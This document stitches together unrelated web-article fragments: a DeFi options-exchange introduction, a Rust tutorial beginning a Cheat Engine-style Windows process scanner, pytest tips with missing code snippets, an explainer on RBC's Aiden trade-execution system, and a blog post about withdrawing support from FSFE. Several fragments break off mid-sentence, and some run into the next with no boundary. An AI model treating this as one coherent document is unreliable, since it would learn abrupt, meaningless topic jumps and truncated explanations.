<p>Now, let’s look at some (not alphabetically ordered) key DeFi concepts that play an important role in this project. Feel free to jump ahead some of them if they seem too basic for you, they are included to offer newcomers a more complete introduction.</p>

<h2>Smart contracts</h2>

<p>If you’re new to ethereum development you must know that smart contracts constitute the source code of decentralized applications (dapp). It’s solidity code, simply put.</p>

<p>A smart contract defines functions with varying degrees of visibility that perform calculations, modify blockchain state and emit logs. <u>External and public functions are the API of a dapp</u> and can be called by any participant of the ethereum network. Internal and private functions on the other hand can only be called by the smart contract itself or its derivations in the case of the former.</p>

<p>Dapps live in the blockchain, i.e., their source code is stored in its blocks and ran upon demand, somewhat similar to the serverless computing model. Nonetheless the ethereum network guaranties atomicity, meaning that at any given moment only a single function is being executed as if it had the entire blockchain available for itself alone.</p>

<p>When smart contract functions are executed they potentially alter state. If so changes are definitive, persisted into the blockchain and available to be audited by any node in the network. Without getting into too much detail this model of execution is what gives ethereum its decentralized quality, anyone can execute code and anyone can audit executed code.</p>

<p>As I’ve pointed out before feel free to browse the options exchange source code in the <a href="https://github.com/TCGV/DeFiOptions">project’s GitHub repository</a> at any time for evaluating a range of smart contracts examples.</p>

<h2>Tokenization</h2>

<p>Tokenization is the process of converting physical and non-physical assets into digital tokens on the blockchain. It’s notably done by implementing the <a href="https://eips.ethereum.org/EIPS/eip-20">ERC20 interface</a> which is nothing more than a definition of functions and events that once implemented allow any network participant to interact with such token for querying total token supply, querying an account’s token balance, transfering tokens between accounts, and approving token allowances.</p>

<p>By following the ERC20 standard newly created tokens can take advantage of numerous DeFi primitives already available in the blockchain. With that in mind I’ve implemented the options exchange to adopt tokenized options, allowing option writers to easily manage them, for instance for transfering options to a third-party willing to purchase them.</p>

<p>My take on tokenization was to incorporate a base ERC20 implementation into the project’s repository and make all smart contracts that I needed tokenized to inherit from it:</p>

<div><div><pre><code>import "../utils/ERC20.sol";

contract OptionToken is ERC20 {

	// contract source code
	
}

contract CreditToken is ManagedContract, ERC20 {

	// contract source code
	
}
</code></pre></div></div>

<p>The base implementation allows derived contracts to override base functions definitions for implementing specific behavior such as the credit token interest rate accrual mechanism.</p>

<h2>Stablecoins</h2>

<p>Stablecoins are cryptocurrencies designed to minimize the volatility of the price of the stablecoin, relative to some “stable” asset or basket of assets. A stablecoin can be pegged to a cryptocurrency, fiat money, or to exchange-traded commodities.</p>

<p>This project adopts stablecoins pegged to the US dollar. Traders can deposit any of the accepted stablecoins as balance for writing options. It’s worth noting that these stablecoins are also ERC20 compliant, as to reinforce the importance of this standard. For reference, the table below depicts the market cap for the five biggest stablecoins at this time:</p>

<table>
  <thead>
    <tr>
      <th>Name</th>
      <th>Code</th>
      <th>Market Cap</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>Theter</strong></td>
      <td>USDT</td>
      <td>$ 30.76B</td>
    </tr>
    <tr>
      <td><strong>USD Coin</strong></td>
      <td>USDC</td>
      <td>$ 7.28B</td>
    </tr>
    <tr>
      <td><strong>Multi-Collateral Dai</strong></td>
      <td>DAI</td>
      <td>$ 2.07B</td>
    </tr>
    <tr>
      <td><strong>Binance USD</strong></td>
      <td>BUSD</td>
      <td>$ 1.83B</td>
    </tr>
    <tr>
      <td><strong>Paxos Standard</strong></td>
      <td>PAX</td>
      <td>$ 681.87M</td>
    </tr>
  </tbody>
</table>

<p>I’ve decided to adopt stablecoins instead of other cryptocurrencies (such as ether itself) in the hopes of making the options exchange more palpable and appealing to traders that may not be insterested in being exposed to non stable cryptocurrencies while trading options. Also, this decision has helped to reduce code complexity by eliminating the need to constantly perform currencies value conversions between one another.</p>

<h2>Collateralization</h2>

<p>Collateralization is the use of a valuable asset to secure a liability. It is a heavily adopted concept in the DeFi space.</p>

<p>In this project every option is backed by a stablecoin deposit provided as collateral, and if an option writer defaults on his liability, the option holder may seize the asset to offset the loss. Collateralization of assets gives holders a sufficient level of reassurance against default risk.</p>

<p>You can get more details on the exchange’s collateralization requirements in the <a href="https://github.com/TCGV/DeFiOptions#collateral-allocation">collateral allocation section</a> of the repository documentation, in which I present the ad-hoc formula that’s being used to achieve improved capital efficiency.</p>

<h2>Oracles</h2>

<p>One of the drawbacks of dapps is that they are isolated from the real-world and are only able to read data that is already persisted in the blockchain. Relying on off-chain data would break the chain of trust, since it would be impossible for other network participants to audit such data to make sure it wasn’t forged.</p>

<p>Fortunately there’s a solution to this impediment, Oracles! An oracle is a third-party blockchain component that allows smart contracts within ethereum to receive external data from outside of their ecosystem. For this project decentralized price feed oracles are being used, which employ on-chain consensus protocols for providing …</p></div></div>

It comes with a memory scanner, (dis)assembler, inspection tools and a handful other things. In this series, we will be writing our own tiny Cheat Engine capable of solving all steps of the tutorial, and diving into how it all works underneath.</p><p>Needless to say, we're doing this for private and educational purposes only. One has to make sure to not violate the EULA or ToS of the specific application we're attaching to. This series, much like cheatengine.org, does not condone the illegal use of the code shared.</p><p>Cheat Engine is a tool for Windows, so we will be developing for Windows as well. However, you can also <a href="https://stackoverflow.com/q/12977179/4759433">read memory from Linux-like systems</a>. <a href="https://github.com/scanmem/scanmem">GameConqueror</a> is a popular alternative to Cheat Engine on Linux systems, so if you feel adventurous, you could definitely follow along too! The techniques shown in this series apply regardless of how we read memory from a process. You will learn a fair bit about doing FFI in Rust too.</p><p>We will be developing the application in Rust, because it enables us to interface with the Windows API easily, is memory safe (as long as we're careful with <code>unsafe</code>!), and is speedy (we will need this for later steps in the Cheat Engine tutorial). You could use any language of your choice though. For example, <a href="https://lonami.dev/blog/ctypes-and-windows/">Python also makes it relatively easy to use the Windows API</a>. You don't need to be a Rust expert to follow along, but this series assumes some familiarity with C-family languages. Slightly advanced concepts like the use of <code>unsafe</code> or the <code>MaybeUninit</code> type will be briefly explained. What a <code>fn</code> is or what <code>let</code> does will not be explained.</p><p><a href="https://github.com/cheat-engine/cheat-engine/">Cheat Engine's source code</a> is mostly written in Pascal and C. And it's <em>a lot</em> of code, with a very flat project structure, and files ranging in the thousand lines of code each. It's daunting<sup><a href="#1">1</a></sup>. It's a mature project, with a lot of knowledge encoded in the code base, and a lot of features like distributed scanning or an entire disassembler. Unfortunately, there's not a lot of comments. For these reasons, I'll do some guesswork when possible as to how it's working underneath, rather than actually digging into what Cheat Engine is actually doing.</p><p>With that out of the way, let's get started!</p><h2 id="welcome-to-the-cheat-engine-tutorial">Welcome to the Cheat Engine Tutorial</h2><details open=""><summary>Cheat Engine Tutorial: Step 1</summary> <blockquote><p>This tutorial will teach you the basics of cheating in video games.

But we need a way to find that process in the first place! Having to open the task manager, look for the process we care about, noting down the process ID (PID), and slapping it in the source code is not satisfying at all. Instead, let's enumerate all the processes from within the program, and let the user select one by typing its name.</p><p>From a quick <a href="https://ddg.gg/winapi%20enumerate%20all%20processes">DuckDuckGo search</a>, we find an official tutorial for <a href="https://docs.microsoft.com/en-us/windows/win32/psapi/enumerating-all-processes">Enumerating All Processes</a>, which leads to the <a href="https://docs.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumprocesses"><code>EnumProcesses</code></a> call. Cool! Let's slap in the <a href="https://crates.io/crates/winapi"><code>winapi</code></a> crate on <code>Cargo.toml</code>, because I don't want to write all the definitions by myself:</p><pre><code data-lang="toml">[dependencies]
winapi = { version = "0.3.9", features = ["psapi"] }
</code></pre><p>Because <a href="https://docs.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumprocesses"><code>EnumProcesses</code></a> is in <code>Psapi.h</code> (you can see this in the online page of its documentation), we know we'll need the <code>psapi</code> crate feature. Another option is to search for it in the <a href="https://docs.rs/winapi/"><code>winapi</code> documentation</a> and noting down the parent module where its stored.</p><p>The documentation for the method has the following remark:</p><blockquote><p>It is a good idea to use a large array, because it is hard to predict how many processes there will be at the time you call <strong>EnumProcesses</strong>.</p></blockquote><p><em>Sidenote: reading the documentation for the methods we'll use from the Windows API is extremely important. There's a lot of gotchas involved, so we need to make sure we're extra careful.</em></p><p>1024 is a pretty big number, so let's go with that:</p><pre><code data-lang="rust">use std::io;
use std::mem;
use winapi::shared::minwindef::{DWORD, FALSE};

pub fn enum_proc() -&gt; io::Result&lt;Vec&lt;u32&gt;&gt; {
    let mut pids = Vec::&lt;DWORD&gt;::with_capacity(1024);
    let mut size = 0;
    // SAFETY: the pointer is valid and the size matches the capacity.
    if unsafe {
        winapi::um::psapi::EnumProcesses(
            pids.as_mut_ptr(),
            (pids.capacity() * mem::size_of::&lt;DWORD&gt;()) as u32,
            &amp;mut size,
        )
    } == FALSE
    {
        return Err(io::Error::last_os_error());
    }

    todo!()
}
</code></pre><p>We allocate enough space<sup><a href="#2">2</a></sup> for 1024 <code>pids</code> in a vector<sup><a href="#3">3</a></sup>, and pass a mutable pointer to the contents to <code>EnumProcesses</code>. Note that the size of the array is in <em>bytes</em>, not items, so we need to multiply the capacity by the size of <code>DWORD</code>. The API likes to use <code>u32</code> for sizes, unlike Rust which uses <code>usize</code>, so we need a cast.</p><p>Last, we need another mutable variable where the amount of bytes written is stored, <code>size</code>.</p><blockquote><p>If the function fails, the return value is zero. To get extended error information, call <a href="https://docs.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-getlasterror"><code>GetLastError</code></a>.</p></blockquote><p>That's precisely what we do. If it returns false (zero), we return the last OS error. Rust provides us with <a href="https://doc.rust-lang.org/stable/std/io/struct.Error.html#method.last_os_error"><code>std::io::Error::last_os_error</code></a>, which essentially makes that same call but returns a proper <code>io::Error</code> instance. Cool!</p><blockquote><p>To determine how many processes were enumerated, divide the <em>lpcbNeeded</em> value by <code>sizeof(DWORD)</code>.</p></blockquote><p>Easy enough:</p><pre><code data-lang="rust">let count = size as usize / mem::size_of::&lt;DWORD&gt;();
// SAFETY: the call succeeded and count equals the right amount of items.
unsafe { pids.set_len(count) };
Ok(pids)
</code></pre><p>Rust doesn't know that the memory for <code>count</code> items were initialized by the call, but we do, so we make use of the <a href="https://doc.rust-lang.org/stable/std/vec/struct.Vec.html#method.set_len"><code>Vec::set_len</code></a> call to indicate this. The Rust documentation even includes a FFI similar to our code!</p><p>Let's give it a ride:</p><pre><code data-lang="rust">fn main() {
    dbg!(enum_proc().unwrap().len());
}
</code></pre><pre><code>&gt;cargo run
   Compiling memo v0.1.0
    Finished dev [unoptimized + debuginfo] target(s) in 0.20s
     Running `target\debug\memo.exe`
[src\main.rs:27] enum_proc().unwrap().len() = 178
</code></pre><p>It works! But currently we only have a bunch of process identifiers, with no way of knowing which process they refer to.</p><blockquote><p>To obtain process handles for the processes whose identifiers you have just obtained, call the <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess"><code>OpenProcess</code></a> function.</p></blockquote><p>Oh!</p><h2 id="opening-a-process">Opening a process</h2><p>The documentation for <code>OpenProcess</code> also contains the following:</p><blockquote><p>When you are finished with the handle, be sure to close it using the <a href="https://lonami.dev/blog/woce-1/closehandle"><code>CloseHandle</code></a> function.</p></blockquote><p>This sounds to me like the perfect time to introduce a custom <code>struct Process</code> with an <code>impl Drop</code>! We're using <code>Drop</code> to cleanup resources, not behaviour, so it's fine. <a href="https://internals.rust-lang.org/t/pre-rfc-leave-auto-trait-for-reliable-destruction/13825">Using <code>Drop</code> to cleanup behaviour is a bad idea</a>. But anyway, let's get back to the code:</p><pre><code data-lang="rust">use std::ptr::NonNull;
use winapi::ctypes::c_void;

pub struct Process {
    pid: u32,
    handle: NonNull&lt;c_void&gt;,
}

impl Process {
    pub fn open(pid: u32) -&gt; io::Result&lt;Self&gt; {
        todo!()
    }
}

impl Drop for Process {
    fn drop(&amp;mut self) {
        todo!()
    }
}
</code></pre><p>For <code>open</code>, we'll want to use <code>OpenProcess</code> (and we also need to add the <code>processthreadsapi</code> feature to the <code>winapi</code> dependency in <code>Cargo.toml</code>). It returns a <code>HANDLE</code>, which is a nullable mutable pointer to <code>c_void</code>. If it's null, the call failed, and if it's non-null, it succeeded and we have a valid handle. This is why we use Rust's <a href="https://doc.rust-lang.org/stable/std/ptr/struct.NonNull.html"><code>NonNull</code></a>:</p><pre><code data-lang="rust">// SAFETY: the call doesn't have dangerous side-effects.
NonNull::new(unsafe { winapi::um::processthreadsapi::OpenProcess(0, FALSE, pid) })
    .map(|handle| Self { pid, handle })
    .ok_or_else(io::Error::last_os_error)
</code></pre><p><code>NonNull</code> will return <code>Some</code> if the pointer is non-null. We map the non-null pointer to a <code>Process</code> instance with <code>Self { .. }</code>. <code>ok_or_else</code> converts the <code>Option</code> to a <code>Result</code> with the error builder function we provide if it was <code>None</code>.</p><p>The first parameter is a bitflag of permissions we want to have. For now, we can leave it as zero (all bits unset, no specific permissions granted). The second one is whether we want to inherit the handle, which we don't, and the third one is the process identifier. Let's close the resource handle on <code>Drop</code> (after adding <code>handleapi</code> to the crate features):</p><pre><code data-lang="rust">// SAFETY: the handle is valid and non-null.
unsafe { winapi::um::handleapi::CloseHandle(self.handle.as_mut()) };
</code></pre><p><code>CloseHandle</code> can actually fail (for example, on double-close), but given our invariants, it won't. You could add an <code>assert!</code> to panic if this is not the case.</p><p>We can now open processes, and they will be automatically closed on <code>Drop</code>. Does any of this work though?</p><pre><code data-lang="rust">fn main() {
    let mut success = 0;
    let mut failed = 0;
    enum_proc().unwrap().into_iter().for_each(|pid| match Process::open(pid) {
        Ok(_) =&gt; success += 1,
        Err(_) =&gt; failed += 1,
    });

    eprintln!("Successfully opened {}/{} processes", success, success + failed);
}
</code></pre><pre><code>&gt;cargo run
   Compiling memo v0.1.0

For doing so, I add the following lines in the <a href="https://docs.python.org/3/distutils/configfile.html" rel="noopener">configuration <em>setup.cfg</em></a> file:</p><pre><span id="5bf7">[tool:pytest]<br>testpaths = tests<br>addopts = --cov --cov-report xml --cov-report term --cov-report html</span></pre><p id="4e04">I use<a href="https://docs.github.com/en/actions/quickstart" rel="noopener"> GitHub actions</a> to tests my Python code. The following snippet defines the commands that I use to install and run the Pytest dependencies:</p><pre><span id="2cdc">- name: Install the library<br>        run: |<br>          pip install -e .[test]</span><span id="458d">- name: Test<br>        run: |<br>          pytest --cov-config setup.cfg</span><span id="cf4a">- name: coverage<br>        uses: codecov/codecov-action@v1<br>        with:<br>          file: ./coverage.xml<br>          name: codecov-umbrella</span></pre><p id="3b63">The final action takes the automatically generated coverage and send it to <a href="https://github.com/codecov/codecov-action" rel="noopener">codecov</a>. Pretty neat, right?</p><p id="1d19">Sometimes you find yourself wanting to get a temporal folder to write output files from your server, simulation, etc. in order to check that things are going as expected. The following snippet shows you how to do so:</p><figure><div></div></figure><p id="d38e">Notice that <code>tmp_path</code> is an argument provided automatically by Pytest. You just need to use it in your code.</p><p id="6558"><a href="https://mock.readthedocs.io/en/latest/" rel="noopener">Mocking functionality</a> is a cool trick when you need to test expensive or complex code, like calling a web service.</p><p id="dfbb">Let’s suppose that I have a command line interface to interact with a web service and I will like to test its behavior. I would first mock the reading of the user’s arguments by <a href="https://docs.python.org/3/library/argparse.html" rel="noopener">argparse</a>, then I would mock the expensive or complex functionality, like calling a web service. The following snippet shows how you can do so:</p><figure><div></div></figure><p id="5394">Notice that the <code>mocker</code> argument is automatically injected by Pytest. For more information check the <a href="https://pypi.org/project/pytest-mock/" rel="noopener">pytest-mock page</a>.</p><p id="a7d8">A common pattern when testing is to mock part of the functionality, while writing some output to a file. For doing so, you use both a <em>mocker</em> object and a <em>temporal file</em>, like:</p><figure><div></div></figure><p id="4faf">Testing that an exception is raised helps to check that your code functionality behaves as expected, for example when the wrong arguments are passed or the user runs into a corner case. The following snippet allows you to test that behavior:</p><figure><div></div></figure><p id="6b08">Sometimes is very useful to skip a test if a dependency is not present at runtime. Maybe the dependency takes a lot of time to install in the CI or it is a proprietary package that you cannot install easily. You can skip those tests with the following snippet:</p><figure><div></div></figure><p id="fcb2">I personally love to use <a href="https://docs.python.org/3/library/typing.html" rel="noopener">type hints</a> in my functions and methods. I use <a href="http://mypy-lang.org/" rel="noopener">mypy</a> to check that those types make sense. the following snippet presents the configuration that I use to call <a href="http://mypy-lang.org/" rel="noopener">mypy</a> on a package.</p><figure><div></div></figure><p id="b608">Notice that you need to define a <a href="https://mypy.readthedocs.io/en/stable/config_file.html" rel="noopener">mypy.ini</a> file somewhere in your repository ( I put that file inside the <em>tests</em> folder). I also prefer that the mypy raises some warnings if there are issues with the types instead of raising a (very annoying) error.</p><p id="6f44">As an alternative to the above snippet, you can install and run the <a href="https://pypi.org/project/pytest-mypy-plugins/" rel="noopener">pytest-mypy-plugins</a>.</p><p id="a23a">Testing the documentation is a must have. The following snippet shows how you can do so:</p><figure><div></div></figure><p id="3422">If you do web applications or something similar you probably have run into Python <a href="https://docs.python.org/3/library/asyncio.html" rel="noopener">asyncio</a>. If you try to run async code using normal pytest code, chances are that you wouldn’t notice that there are no tests running at all. <em>Async code is lazy and requires that you run it inside an async block</em>, otherwise nothing interesting happens. The following snippet shows how to invoke async code in Pytest:</p><figure><div></div></figure><p id="278f">For more details about testing asynchronous code in python check <a href="https://github.com/pytest-dev/pytest-asyncio" rel="noopener">pytest-asyncio</a>.</p><p id="4004">If you, like me, have the tendency to procrastinate while waiting for the test suite to finish executing, then a good way to reduce the procrastination time is to run the tests in parallel.</p><p id="08d5">For running your tests in parallel, you just need to install the <a href="https://github.com/browsertron/pytest-parallel" rel="noopener">pytest-parallel</a> library that not only allows you to run your tests in parallel but also in a thread-safe manner, using commands as simple as:</p><pre><span id="63e2">pytest --workers 2</span></pre><p id="e2c8">Imaging that you have a simulation that receives some parameters as input and gives you back some numerical output. You can use <a href="https://docs.pytest.org/en/stable/parametrize.html" rel="noopener">pytest’s parametrize extension</a> to feed one parameter at a time to the simulation and check that each one of them returns the expected output. The following snippet shows how to accomplish that:</p><figure><div></div></figure><p id="658b">If you run the previous snippet, you should see something like:</p><pre><span id="843e">pytest -v test_parameters.py<br>test_parameters.py::test_simulation[pi-3.141592653589793] PASSED                                      <br>test_parameters.py::test_simulation[exp-2.718281828459045] FAILED</span><span id="9c2b">parameter = 'exp', expected = 2.718281828459045</span><span id="5b28"><a href="http://twitter.com/pytest" rel="noopener">@pytest</a>.mark.parametrize("parameter, expected", <br>                         [("pi", np.pi), ("exp", np.exp(1))])<br>    def test_simulation(parameter: str, expected: float) -&gt; None:<br>        """Check the simulation."""<br>        result = run_simulation(parameter)<br>&gt;       assert abs(result - expected) &lt; 1e-8<br>E       assert 39.28171817154095 &lt; 1e-08<br>E        +  where 39.28171817154095 = abs((42 - 2.718281828459045))</span><span id="8d88">test_parameter.py:16: AssertionError</span></pre><p id="69bf">Pytest is a flexible tool with a great number of useful extensions.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>This article describes a system&nbsp;called&nbsp;<a href="https://www.rbccm.com/en/expertise/electronic-trading/ai-trading.page?utm_source=rbc&amp;utm_medium=va&amp;utm_campaign=aiden" target="_blank">Aiden</a>,&nbsp;developed jointly by <a href="https://www.rbccm.com/en/home.page" target="_blank">RBC Capital Markets</a>&nbsp;and <a href="https://www.borealisai.com/en/" target="_blank">Borealis AI</a>. At a high level, Aiden aims to solve&nbsp;the following problem:&nbsp;a customer indicates that they wish to buy or sell a certain number of units of an asset and it is the broker’s responsibility to execute this order within a specified time window, seeking prices that minimize loss relative to a specified benchmark.&nbsp; For simplicity of exposition this article is restricted to the former case (buy orders).</p>

<p>This execution problem sounds straightforward but there are several complications. A naive approach might be to wait until the price seems "low enough"&nbsp;and then buy all the shares at once.&nbsp;Putting aside the question of how to&nbsp;define "low enough",&nbsp;this method has a huge drawback. Executing a large order all at once creates a great deal of demand and the effect of this is to increase the price (market impact). Unfortunately, this&nbsp;action has an undesirable effect on the final price achieved.&nbsp;Consequently, it could be more sensible to buy the shares gradually through the specified time period.&nbsp;But how many should the broker&nbsp;buy, and when?</p>

<p>To the savvy machine learning researcher, it will be obvious that this problem lends itself to a reinforcement learning formulation.&nbsp;The execution algorithm must make a series of sequential decisions about how many shares to buy at each time step and receives rewards in the form of low execution prices.&nbsp;</p>

<p>The structure of the rest of this article is as follows.&nbsp;First, we describe&nbsp;the order execution problem in more detail. This will necessitate a discussion of how modern financial markets work in practice and the limit order book.&nbsp;Then we&nbsp;provide&nbsp;a brief review of reinforcement learning and describe&nbsp;how it maps to this problem. Finally, we describe the practical details of the Aiden system.</p>

<h2>Limit order markets</h2>

<p>Contemporary financial markets such as the TSX/NYSE/NASDAQ are <em>limit order markets</em>.&nbsp;This means that traders who wish to purchase shares can specify not only the volume they wish to purchase, but also the maximum price (limit<em>)</em>&nbsp;that they are prepared to pay. More formally, a <em>limit order</em>&nbsp;can be specified by the tuple $\{\tau, p, n\}$ where $\tau\in\{0,1\}$ specifies whether this is a buy or sell order, $p$ is the specified price limit, and $n$ is the maximum number of shares to be&nbsp;traded.&nbsp;The possible prices of the shares in the order book are discrete, and the smallest difference allowable between them is a <em>tick</em>.&nbsp;</p>

<p>The <em>limit order book</em>&nbsp;consists of the set of all current limit orders.&nbsp;It can be visualized as two histograms (figure 1).&nbsp;The first consists of the volume of the buy orders at each discrete price level and the second consists of volumes of the sell orders.&nbsp;The highest buy order is known as the current <em>bid</em>&nbsp;price and the lowest sell order is known as the current <em>ask</em>&nbsp;price.&nbsp;The difference between the two is known as the <em>bid-ask spread</em>&nbsp;and the average of the two is known as the <em>mid-price</em>.</p>

In a single market scenario, the ranges of the two histograms are always non-overlapping; if they were not then the buy and sell prices would match and a transaction would occur.

<h2><small>Limit orders</small></h2>

<p>When a trader enters a buy limit order that is at or above the current ask price, the order will receive executions. The first trades will occur at the current ask price, but if the volume of the buy order exceeds the volume available at that price, the order will continue at the next price level. This process occurs until either the entire order has been fulfilled, or it reaches&nbsp;the specified limit.&nbsp;In this case, there are insufficient shares available for sale at or below this limit and so the order is only partially filled.&nbsp;Hence, the overall effect of placing a limit order is that the price is guaranteed to be within the specified limit, but the volume is not.</p>

<p>Any remaining unfulfilled part of the order is then added to the buy side of the limit order book and remains there until it is either (i) matched by a new sell-side order (ii) its time limit expires or (iii) it is removed by the trader. Orders are typically matched based on a first-in / first-out basis for most trading venues; in this instance,&nbsp;any order placed below the current ask price will be placed last in the queue for that particular price level. A worked example of a limit order is given in figure 2.</p>

        <span>Figure 2. Limit order example. Starting with the situation in figure 1, a buy order is placed for 1750 shares with a limit of 166.01, meaning that this is the maximum price the trader is prepared to pay for them. This order is first matched with the lowest possible price and 500 shares are bought at a price of 166.00 (represented by left-most pale blue bar). This leaves 1250 unfulfilled units in the buy order. The next lowest price (166.01) is also within the limit and so we also purchase all of the 250 shares at this level (represented by right-most pale blue bar). This leaves 1000 unfulfilled units in the buy order. Unfortunately, the next price on the sell side is above the specified limit and so no further transactions occur at this time. The remaining order for 1000 shares is entered into the limit order book (rightmost green bar). Note that the effect of this is that both the bid and ask prices increase and hence so does the mid-price. Placing this aggressive order increases the effective price of the asset.</span>





 </p>

<h2><small>Market orders</small></h2>

<p>In addition to limit orders it is possible to place a <em>market order</em>&nbsp;which is specified by the volume $n$ of shares that we wish to buy. Essentially, this means that the trader will buy all $n$ shares now at whatever prices are available on the sell side of the limit order book.&nbsp;So first the trader buys shares at the current ask price. If the volume of the buy order exceeds the volume available at the current ask price, the trader will continue fulfilling the order at the next best price and so on.&nbsp;Effectively, a market order is hence a limit order where the limit is $+\infty$.&nbsp;A worked example of a market order is given in figure 3.</p>

<p>








<img src="https://www.borealisai.com/media/filer_public_thumbnails/filer_public/6b/32/6b32a4e5-a60d-4efb-9377-623ebbefe9c2/aiden_figure3.png__6000x3750_q85_subject_location-3000%2C1871_subsampling-2.png">



        <span>Figure 3. Market order example. Starting with the situation in figure 1, the trader places a market buy order for 2250 shares. To fulfil this order, they first look to the lowest possible sell price of 166.00 and since there are only 500 units for sale at this price, they buy all of them (leftmost pale blue bar). The trader continues in this way, buying all of the units at prices 166.01 and 166.02. The volume for sale at 166.03 is sufficient to fulfil the remaining part of the order and some shares are left for sale at this level which becomes the new ask price. Hence, after a market buy order, the ask price increases, but the bid price remains the same. It follows that the bid-ask spread and the mid-price must both increase. Once more, the demand created by the order causes the effective price to inflate.</span>





 </p>

<h2><small>Market impact of orders</small></h2>

<p>Notice that for both the limit order and the market order, a large volume affects the current ask price.&nbsp;As the volume at one price level is exhausted the ask price increases to the next level where there is non-zero volume. Hence, by placing a large volume buy order, ceteris paribus, it&nbsp;may have a large impact on the market and the mid-price (a proxy for current stock price) correspondingly increases.&nbsp;</p>

<h2>Order execution</h2>

<p>Now that limit order book has been explained, let's return to the problem of order execution.&nbsp;The goal is to buy a known volume $V$ of shares within a given time window $[0,T]$. This is typically referred to as the parent order (or meta order). At each time step $0\leq t &lt; T$ the trader can place a limit order,&nbsp;remove an existing limit order, or place a market order by tranching parts of the meta order into smaller parts (child orders) as to minimize market impact. As the trader reaches the end of the execution timeframe, they can make use of more aggressively priced orders to complete their order, potentially at a higher cost.</p>

<h2><small>Market micro-structure data</small></h2>

<p>How can a trader&nbsp;decide which action to take at each time step?&nbsp;Electronic markets release in real-time the contents of the limit order book and the trader can use this data as a basis for their&nbsp;decisions.&nbsp;Such <em>market micro-structure data</em>&nbsp;comes in two different resolutions which are referred to as level I and level II data respectively.&nbsp;Level I data includes the current bid price and associated volume, the current ask price and associated volume and the price and volume of the last transaction.&nbsp;Level II data includes more details about the contents of the limit order book; for example, it might include the top ten current bid and ask orders and their associated volumes.</p>

<p>It's clear that this market micro-structure data contains clues about when it might be a good idea to place an order.&nbsp;For example, if the ask-price is decreasing over time, it might be worth using this <em>momentum</em>&nbsp;signal to delay buying shares. Similarly, if there is a lot more volume on the sell side than the buy side of the limit order book then this gives an insight into the current levels of supply and demand and this may similarly affect the&nbsp;decision to execute an order at this time or not. In addition, the time stamp and …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>So it looks like my quick, but on-the-spot <a href="https://flameeyes.blog/2020/12/22/i-no-longer-support-fsfe/">renegation of FSFE</a> last December made the round much further than most of the blog posts I ever write. I think that, in comparison, it made a much wider range than my original <a href="https://flameeyes.blog/2010/02/10/i-do-support-fsfe-it-s-positive/">FSFE support post</a>.</p>



<p>So I thought it would be worth spending a little more time to point out <em>why</em> I decided to openly stop supporting FSFE — I did provide most of this reasoning in short form on Twitter, but I thought this is better summarised in a blog post that others can reference, and that I can point people at.</p>



<p>So first of all, this is <strong>not all about the allegations</strong>. It was very easy to paint my post, and all the other critical outbursts against FSFE, as a position taken on hearsay. But as I already said, this was just the “flash trigger” of me calling back the support for an organization for which my feeling cooled down significantly for <em>years</em>. Again, I said already in the other post that I got in touch with Matthias a few years ago already about my concerns with the organization, and it was <a href="https://flameeyes.blog/2017/09/14/public-money-public-code/">Public Money, Public Code</a> that kept me as a supporter since then.</p>



<p>The reason why I decided to write renege my support when the allegations were extended, and I even changed my posts schedule for it, is that I didn’t want my (much older) post on supporting FSFE to be used as an excuse to support an organization that was in the middle of a controversy. I have been a strong supporter and have been talking people about FSFE for years, including about their more recent <a href="https://flameeyes.blog/2020/04/23/reuse-simplifying-code-licensing/">REUSE initiative last year</a>, and I wouldn’t have wanted to be used as a shield from criticism.</p>



<p>I had an entire draft complaining about the way FSFE made me feel most like I was supporting FSFG (Free Software Foundation Germany), and that doesn’t seem to have changed <em>that</em> much since I wrote it two years ago. Both the news page and the activities page at the time of writing are clearly highlighting a tight focus on German issues, including talking in very broad strokes about how the <a href="https://fsfe.org/news/nl/nl-202012.en.html">German Corona Warn App doesn’t need Google</a> – strokes so broad that make it feel like a lot of smoke and no meat underneath – and still more focus on dealing with router lock-ins (<a href="https://flameeyes.blog/2016/12/05/ethical-implications-of-selling-routers/">missing a lot of nuance</a>).</p>



<p>I do understand that, if most of the volunteers engaging are German they will care about German issues the most, and that if the “wins” come from Germany, obviously the news will be filled with German wins. But at the same time, an organization that wants to be European should strive to have some balance and decide <em>not</em> to use all the news coming from a single country. Looking at the news archive page at the time I’m writing this post, there’s seven references to «Germany», one to «France», and none to «Italy», «Ireland», «United Kingdom», «Great Britain», and so on.</p>



<p>And it’s not that there’s <em>nothing</em> happening in those other countries. <a href="https://en.wikipedia.org/wiki/COVID_Tracker_Ireland">COVID Tracker Ireland</a>, to stay in the topic of Covid tracing apps, is also Free Software (licensed under MIT license), and a number of other apps have been literally built based on its code. <em>Public Money, Public Code</em> to its best! But nothing about it on the FSFE’s website, while there’s a number of references to the German app instead.</p>



<p>And again speaking of <em>Public Money, Public Code</em>, Italy doesn’t seem to be represented at all in their list of news, with the only reference being a two years old entry about “FSFE Italy” asking for support to the project by political parties. This despite the fact that the Italian <em>Team Digitale</em> and the established pagoPA company have been also <a href="https://github.com/pagopa">releasing a lot of Free Software</a>.</p>



<p>Once again, if you want to change the direction of an organization, joining directly and “walking the walk” would help. But there’s a number of reasons why that might be difficult for people. While I was working for Google – a cloud provider, very clearly – it would have been fairly difficult for me to join an organization with loud complaints about “the cloud” (<a href="https://flameeyes.blog/2020/04/30/bakery-someone-else-oven/">which I anyway disagree with</a>). And similarly given the amount of coverage of privacy, even when not related to Free Software directly, it would be hard for me to be an activist given my current employer.</p>



<p>Before you suggest that this is my problem, and that I’m not the target to such an organization, I want to point out that <em>this is exactly why I didn’t go and say that they are terrible organization and called for a boycott</em>. I just pointed out that I no longer support them. I did say that, out of my experience, I have no reason to disbelieve their accusation, and even after reading their response statement I don’t have any reason to change my mind about that.</p>



